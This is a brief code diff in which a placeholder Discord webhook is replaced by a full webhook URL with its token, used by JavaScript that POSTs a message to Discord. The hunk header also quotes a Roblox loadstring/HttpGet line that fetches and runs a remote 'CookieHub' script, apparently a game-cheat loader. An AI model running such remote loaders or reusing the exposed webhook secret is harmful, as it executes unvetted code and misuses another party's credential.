@@ -20,7 +20,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub
       const message = data.message || 'No message';
 
       // Send to your Discord webhook
-      const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // <<< PUT YOUR WEBHOOK HERE
+      const webhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_'; // <<< PUT YOUR WEBHOOK HERE
 
       await fetch(webhookUrl, {
         method: 'POST',
